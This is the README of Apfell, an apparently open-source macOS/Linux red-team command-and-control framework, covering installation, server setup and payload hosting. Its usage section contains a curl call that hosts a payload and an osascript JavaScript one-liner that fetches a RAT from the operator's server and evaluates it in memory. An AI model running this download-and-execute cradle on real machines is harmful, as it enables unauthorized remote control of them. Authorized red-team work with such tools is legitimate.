# Apfell
A macOS, post-exploit, red teaming framework built with python3 and JavaScript. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout mac and linux based red teaming. This is a work-in-progress as I have free time, so please bear with me.

## Details
Check out my [blog post](https://its-a-feature.github.io/posts/2018/07/bare-bones-apfell-server-code-release/) on the initial release of the framework and what the bare bones content can do.

## Installation

- Get the code from this github:
```bash
git clone https://github.com/its-a-feature/Apfell
```
- Install and setup the requirements (Note: This only runs on Linux right now):
```bash
# Install postgres and pip3 install the requirements
cd Apfell && ./setup.sh && cd ..
```
- Configure the installation in app/\_\_init\_\_.py:
```bash
# -------- CONFIGURE SETTINGS HERE -----------
db_name = 'apfell_db'
db_user = 'postgres'
db_pass = 'postgres'
server_ip = '192.168.0.119'
```
- Optionally configure the IP and port for the server to listen on in Server.py:
```bash
if __name__ == "__main__":
    asyncio.set_event_loop(dbloop)
    server = apfell.create_server(host='0.0.0.0', port=80) # edit this line
```
## Usage

- Start the server:
```bash
python3 server.py 
[2018-07-16 14:39:14 -0700] [28381] [INFO] Goin' Fast @ http://0.0.0.0:80
```
By default, the server will bind to 0.0.0.0 on port 80. This is an alias meaning that it will be listening on all IPv4 addresses on the machine. You don't actually browse to http://0.0.0.0:80 in your browser. Instead, you'll browse to either http://localhost:80 if you're on the same machine that's running the server, or you can browse to any of the IPv4 addresses on the machine that's running the server. You could also browse to the IP address you specified in `server_ip = '192.168.0.119'` in the installation section.
- Browse to the server with any modern web browser  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/Welcome.JPG)

- Create a new user:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/Register.JPG)

- Create a new payload:  
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/apfell-create-jxa.JPG)

- Use the attacks_api to host the new file (this will eventually get updated with a GUI):  
```bash
# assuming we created a payload in our local '/tmp' directory
curl -X POST'{"port":8080, "directory":"/tmp"}' http://192.168.0.119/api/v1.0/attacks/host_file
```
This will start a python simple web server in the `/tmp` directory on port `8080`.

- Pull down and execute payload in memory:
```bash
osascript -l JavaScript -e "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('HTTP://192.168.0.119:8080/apfell-jxa')),$.NSUTF8StringEncoding)));" 
```
- Interact with the new RAT:
![alt text](https://github.com/its-a-feature/its-a-feature.github.io/raw/master/images/apfell-tasking.JPG)

### In-Server Help
Once you've logged into Apfell, you can access some additional help. 
- CommandLines - provides information about how to interact with the RESTful interface via terminal and Curl
- Documentation - will eventually provide a more thorough manual of how Apfell is organized, how to extend it, how logging works, and how to interact with the dashboards
- apfell-jxa help - provides help on the command lines that can be sent to the apfell-jxa RAT, how they work, and their parameters
